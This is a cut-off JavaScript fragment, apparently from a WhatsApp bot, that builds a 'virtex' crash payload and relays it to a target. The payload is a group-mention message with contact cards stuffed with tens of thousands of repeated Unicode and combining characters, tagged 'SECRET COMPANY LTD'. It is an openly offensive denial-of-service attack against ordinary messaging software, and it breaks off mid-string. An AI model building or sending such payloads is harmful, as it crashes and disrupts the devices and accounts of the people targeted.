  let virtex = "𝚂̸̴̸̡⃨̺̘͚̝͙̪̘͋̓̾͆̓̔͝͝𝙴̴̴̵̡⃨̼̠͉͉͙͖̠̈́̚̚͘͝͝͠𝙲̴̴̸⃨̺̺̫͕̼͎͇͙̿͊͊̔̓̀͝͝͠𝚁̸̸̴⃨̫̝̦͔͓͎͚͚̿̐͒͋̓͊̒̕͝𝙴̸̵̴⃨̼̝͓̺̙̪͚̘̝̓̓̽̓̽̽͑̕𝚃̸̵̵⃨̫͖̙̟͍̦̪͛̓̐̓͌͐̀͘͠ ཉ";  let tembus = 'ါ'.repeat(2000);
  const jids = "@0~".repeat(54100);
  const ui = ' ִ'.repeat(1900);
  let anjing = new Array()
  if (!Array.isArray(ui) || ui.length === 77000) {
    await cella.relayMessage(target, {
      groupMentionedMessage: {
       message: {
        interactiveMessage: {
         header: {
          contactsArrayMessage: {
    displayName: " 𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𝚂𝙴𝙲𝚁𝙴𝚃 𝙲𝙾𝙼𝙿𝙰𝙽𝚈 𝙻𝚃𝙳.𝙲𝙾𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭ㅤ          ㅤ          ㅤ           ༑̴ۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ⟆̤̊༑̴ۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ⟆̤̊" + ui + "ꦾ".repeat(30000),
    contacts: [
      {
        displayName: " 𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𝚂𝙴𝙲𝚁𝙴𝚃 𝙲𝙾𝙼𝙿𝙰𝙽𝚈 𝙻𝚃𝙳.𝙲𝙾𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭ㅤ          ㅤ          ㅤ           ༑̴ۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ⟆̤̊༑̴ۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ⟆̤̊" + jids + "ꦾ".repeat(30000),
        vcard: "BEGIN:VCARD\nVERSION:3.0\nN:+2348146895993\nFN:+2348146895993\nitem1.TEL;waid=2348146895993:2348146895993\nitem1.X-ABLabel:𝙲𝙾𝙽𝚃𝚁𝙰 𝙱𝚈 𝙹𝙸𝙽𝚂${ui}\nitem2.EMAIL;type=INTERNET:🪭𝚂𝙴𝙲𝚁𝙴𝚃 𝙲𝙾𝙼𝙿𝙰𝙽𝚈 𝙻𝚃𝙳🪭${jids}\nitem2.X-ABLabel:YouTube\nitem3.URL:🏮🄲🄾🄽🅃🅁🄰༑̴ۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ⟆̤̊ + ꦾ.repeat(30000)\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;\nitem4.X-ABLabel:Region\nEND:VCARD"
      },
      {
        displayName: " 𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𝚂𝙴𝙲𝚁𝙴𝚃 𝙲𝙾𝙼𝙿𝙰𝙽𝚈 𝙻𝚃𝙳.𝙲𝙾𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭ㅤ          ㅤ          ㅤ           ༑̴ۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ⟆̤̊༑̴ۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗ